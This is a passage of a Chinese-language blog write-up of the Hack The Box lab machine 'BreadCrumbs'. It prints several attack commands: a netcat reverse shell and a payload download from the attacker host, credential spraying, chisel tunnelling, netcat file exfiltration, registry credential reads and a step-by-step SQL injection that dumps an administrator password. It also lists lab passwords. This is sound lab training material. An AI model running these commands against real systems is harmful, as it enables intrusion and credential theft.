+<p><img src="/../imgs/image-20250122102517095.png" srcset="/img/loading.gif" lazyload alt="image-20250122102517095"></p>
+<p>反弹shell即可</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">powrshell -<span class="hljs-keyword">c</span> iwr http://<span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>/nc64.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">o</span> <span class="hljs-keyword">c</span>:\programdata\nc.<span class="hljs-keyword">exe</span><br><br>curl+http://<span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>/nc64.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">o</span> nc.<span class="hljs-keyword">exe</span><br>nc.<span class="hljs-keyword">exe</span>+-<span class="hljs-keyword">e</span>+cmd+<span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>+<span class="hljs-number">9001</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122103120205.png" srcset="/img/loading.gif" lazyload alt="image-20250122103120205"></p>
+<h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-number">3306</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;bread&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;jUli901&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;bread&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>做一下密码喷洒</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">juliette</span><br><span class="hljs-type">Administrator</span><br><span class="hljs-title">development</span><br><span class="hljs-title">www</span>-<span class="hljs-class"><span class="hljs-keyword">data</span></span><br><span class="hljs-title">sshd</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">crackmapexec ssh <span class="hljs-number">10.10</span>.<span class="hljs-number">10.228</span> -u <span class="hljs-keyword">user</span> <span class="hljs-title">-p</span> <span class="hljs-string">&quot;jUli901&quot;</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.228</span> -u <span class="hljs-keyword">user</span> <span class="hljs-title">-p</span> <span class="hljs-string">&quot;jUli901&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122110003208.png" srcset="/img/loading.gif" lazyload alt="image-20250122110003208"></p>
+<p><img src="/../imgs/image-20250122111656177.png" srcset="/img/loading.gif" lazyload alt="image-20250122111656177"></p>
+<p>转发出来看看</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">socks5代理<br>./chisel server -<span class="hljs-keyword">p</span> <span class="hljs-number">6666</span> --<span class="hljs-built_in">reverse</span><br>chisel.<span class="hljs-keyword">exe</span> client <span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>:<span class="hljs-number">6666</span> R:socks<br>.\ci.<span class="hljs-keyword">exe</span> client <span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>:<span class="hljs-number">6666</span> R:socks<br>netstat -ano | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;1080&quot;</span> 看<span class="hljs-number">1080</span>端口情况<br><br>sudo <span class="hljs-keyword">vim</span> /etc/proxychains4.<span class="hljs-keyword">conf</span> <br>socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span><br><br>proxychains <span class="hljs-keyword">nmap</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.228</span> -<span class="hljs-keyword">p</span> <span class="hljs-number">5040</span>,<span class="hljs-number">7680</span>,<span class="hljs-number">3306</span> -sS sV<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122112820839.png" srcset="/img/loading.gif" lazyload alt="image-20250122112820839"></p>
+<p><img src="/../imgs/image-20250122112811375.png" srcset="/img/loading.gif" lazyload alt="image-20250122112811375"></p>
+<p><img src="/../imgs/image-20250122113243303.png" srcset="/img/loading.gif" lazyload alt="image-20250122113243303"></p>
+<p>这里存在账号密码</p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">jUli901./())!<br>jUli901<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122113451240.png" srcset="/img/loading.gif" lazyload alt="image-20250122113451240"></p>
+<p><img src="/../imgs/image-20250122113737875.png" srcset="/img/loading.gif" lazyload alt="image-20250122113737875"></p>
+<p>登ssh</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> juliette@<span class="hljs-number">10.10.10.228</span> <br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122114112877.png" srcset="/img/loading.gif" lazyload alt="image-20250122114112877"></p>
+<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><p><img src="/../imgs/image-20250122114127241.png" srcset="/img/loading.gif" lazyload alt="image-20250122114127241"></p>
+<p><img src="/../imgs/image-20250122114139751.png" srcset="/img/loading.gif" lazyload alt="image-20250122114139751"></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Migrate passwords <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> Microsoft Store Sticky Notes application <span class="hljs-built_in">to</span> our <span class="hljs-built_in">new</span> password manager<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://dingtoffee.medium.com/windows-sticky-notes-forensics-80ee31ab67ef">https://dingtoffee.medium.com/windows-sticky-notes-forensics-80ee31ab67ef</a></p>
+<p><img src="/../imgs/image-20250122120003001.png" srcset="/img/loading.gif" lazyload alt="image-20250122120003001"></p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState<br></code></pre></td></tr></table></figure>
+
+<p>把plum.sqlite、plum.sqlite-shm和plum.sqlite-wal都拿到本地</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">cmd <span class="hljs-symbol">/c</span> <span class="hljs-string">&quot;c:<span class="hljs-char escape_">\p</span>rog</span><br><span class="hljs-string">ramdata<span class="hljs-char escape_">\n</span>c.exe 10.10.16.39 1234 &lt; plum.sqlite&quot;</span> <br><span class="hljs-comment">#windows</span><br><br>nc <span class="hljs-operator">-</span>lp <span class="hljs-number">1234</span> <span class="hljs-operator">&gt;</span> plum.sqlite  <br><span class="hljs-comment">#kali</span><br></code></pre></td></tr></table></figure>
+
+<p>项目解析:<a target="_blank" rel="noopener" href="https://github.com/dingtoffee/StickyParser">https://github.com/dingtoffee/StickyParser</a></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> stickyparser.<span class="hljs-keyword">py</span>  -r ./plum.sqlite  -d .<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122121930368.png" srcset="/img/loading.gif" lazyload alt="image-20250122121930368"></p>
+<p>有juliette的密码</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">reg query <span class="hljs-string">&quot;HKLM<span class="hljs-char escape_">\S</span>oftware<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indows NT<span class="hljs-char escape_">\C</span>urrentVersion<span class="hljs-char escape_">\w</span>inlogon&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>存在AutoLogon的密码</p>
+<p><img src="/../imgs/image-20250122143121369.png" srcset="/img/loading.gif" lazyload alt="image-20250122143121369"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">QNxH2vi01X<br></code></pre></td></tr></table></figure>
+
+<p>上面那个项目不咋地，我们自己查询下</p>
+<p><img src="/../imgs/image-20250122144129050.png" srcset="/img/loading.gif" lazyload alt="image-20250122144129050"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">\<span class="hljs-attribute">id</span>=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!<br>\<span class="hljs-attribute">id</span>=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g<br>ssh development@10.10.10.228<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122144254931.png" srcset="/img/loading.gif" lazyload alt="image-20250122144254931"></p>
+<h3 id="提权3"><a href="#提权3" class="headerlink" title="提权3"></a>提权3</h3><p><img src="/../imgs/image-20250122144437895.png" srcset="/img/loading.gif" lazyload alt="image-20250122144437895"></p>
+<p>拿下来看看</p>
+<p><img src="/../imgs/image-20250122144600263.png" srcset="/img/loading.gif" lazyload alt="image-20250122144600263"></p>
+<p><img src="/../imgs/image-20250122144901702.png" srcset="/img/loading.gif" lazyload alt="image-20250122144901702"></p>
+<p>需要key，逆逆看</p>
+<p><img src="/../imgs/image-20250122155837928.png" srcset="/img/loading.gif" lazyload alt="image-20250122155837928"></p>
+<p>看看靶机端口开放情况</p>
+<p><img src="/../imgs/image-20250122155826449.png" srcset="/img/loading.gif" lazyload alt="image-20250122155826449"></p>
+<p>这样的话请求试试</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash"> /c <span class="hljs-string">&#x27;curl 127.0.0.1:1234/index.php -d &quot;method=select&amp;username=administrator&amp;table=passwords&quot;&#x27;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122160147262.png" srcset="/img/loading.gif" lazyload alt="image-20250122160147262"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">k19D193j</span>.&lt;<span class="hljs-number">19391</span>(<br></code></pre></td></tr></table></figure>
+
+<p>然后把1234转发出来</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">kali:</span><br><span class="hljs-symbol">./chisel</span> server <span class="hljs-operator">-</span>p <span class="hljs-number">6666</span> <span class="hljs-operator">-</span>-reverse<br><span class="hljs-params">windows:</span><br><span class="hljs-symbol">./ci.exe</span> client <span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>:<span class="hljs-number">6666</span> R:<span class="hljs-number">8888</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1234</span><br><span class="hljs-comment">#R:8888意思是使得连接到服务器的 8888 端口的请求将被转发到客户端的 127.0.0.1:8888 端口</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122160932168.png" srcset="/img/loading.gif" lazyload alt="image-20250122160932168"></p>
+<p>成功，再把8888转发到本地1234，然后编辑hosts</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">./chisel client <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">6666</span> R:<span class="hljs-number">1234</span>:<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8888</span><br><br>sudo vim /etc/hosts<br><span class="hljs-number">127.0.0.1</span> passmanager.htb<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122161207214.png" srcset="/img/loading.gif" lazyload alt="image-20250122161207214"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://passmanager.htb:1234/index.php -d <span class="hljs-string">&quot;method=select&amp;username=administrator&amp;table=passwords&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功转发</p>
+<p><img src="/../imgs/image-20250122161838169.png" srcset="/img/loading.gif" lazyload alt="image-20250122161838169"></p>
+<p>不对，也许可以尝试注入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://passmanager.htb:1234/index.php -d <span class="hljs-string">&quot;method=select&amp;username=administrator&#x27;&amp;table=passwords&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122162040579.png" srcset="/img/loading.gif" lazyload alt="image-20250122162040579"></p>
+<p>很脆弱</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">method</span>=select&amp;username=administrator&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#&amp;table=passwords<br><br><span class="hljs-attribute">method</span>=select&amp;username=administrator&#x27; union select 1#&amp;<span class="hljs-attribute">table</span>=passwords<br><br><span class="hljs-attribute">method</span>=select&amp;username=administrator&#x27; union select database()#&amp;<span class="hljs-attribute">table</span>=passwords<br><span class="hljs-comment">#bread</span><br><br><span class="hljs-attribute">method</span>=select&amp;username=administrator&#x27; union select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema = <span class="hljs-string">&#x27;bread&#x27;</span>#&amp;<span class="hljs-attribute">table</span>=passwords<br><span class="hljs-comment">#passwords</span><br><br><span class="hljs-attribute">method</span>=select&amp;username=administrator&#x27; union select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_schema = <span class="hljs-string">&#x27;bread&#x27;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&quot;passwords&quot;</span> #&amp;<span class="hljs-attribute">table</span>=passwords<br><span class="hljs-comment">#id,account,password,aes_key</span><br><br><span class="hljs-attribute">method</span>=select&amp;username=administrator&#x27; union select group_concat(id,<span class="hljs-string">&quot; &quot;</span>,account,<span class="hljs-string">&quot; &quot;</span>,password,<span class="hljs-string">&quot; &quot;</span>,aes_key) <span class="hljs-keyword">from</span> passwords #&amp;<span class="hljs-attribute">table</span>=passwords<br><span class="hljs-comment">#1 Administrator H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= k19D193j.&lt;19391(&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122162148511.png" srcset="/img/loading.gif" lazyload alt="image-20250122162148511"></p>
+<p>应该解aes</p>
+<p><img src="/../imgs/image-20250122171002815.png" srcset="/img/loading.gif" lazyload alt="image-20250122171002815"></p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-number">0000000000000000000000000000000</span><br>p@ssw0rd!@#$9890./<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122171028056.png" srcset="/img/loading.gif" lazyload alt="image-20250122171028056"></p>
+<p>成功</p>
+<p><img src="/../imgs/image-20250122171047195.png" srcset="/img/loading.gif" lazyload alt="image-20250122171047195"></p>
+<h3 id="扩展之逆向分析"><a href="#扩展之逆向分析" class="headerlink" title="扩展之逆向分析"></a>扩展之逆向分析</h3><p>我们对程序进行分析</p>
+<p><img src="/../imgs/image-20250122182335079.png" srcset="/img/loading.gif" lazyload alt="image-20250122182335079"></p>
+<p>1601,判断临界点在哪</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">count = <span class="hljs-number">0</span><br>countint = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    count += <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;a&quot;</span>)<br>    countint +=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> count &gt; <span class="hljs-number">1601</span>:<br>        <span class="hljs-built_in">print</span>(count - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;a&quot;</span>))<br>        <span class="hljs-built_in">print</span>(countint)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">output</span><br><span class="hljs-string">1552</span><br><span class="hljs-string">17</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>那么再补一个49就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">str1 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()-_=+[]&#123;&#125;|;:&#x27;\&quot;,.&lt;&gt;?/~\\&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str1:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i) == <span class="hljs-number">49</span>:<br>        <span class="hljs-built_in">print</span>(i)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">output</span><br><span class="hljs-string">1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>所以最终就是</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">aaaaaaaaaaaaaaaaa1<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250122182744918.png" srcset="/img/loading.gif" lazyload alt="image-20250122182744918"></p>
+<p>成功</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HTB/" class="category-chain-item">HTB</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BreadCrumbs</div>
+      <div>http://example.com/2025/01/22/BreadCrumbs/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>0xptS3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年1月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/18/Aero/" title="Aero">
+                        <span class="hidden-mobile">Aero</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
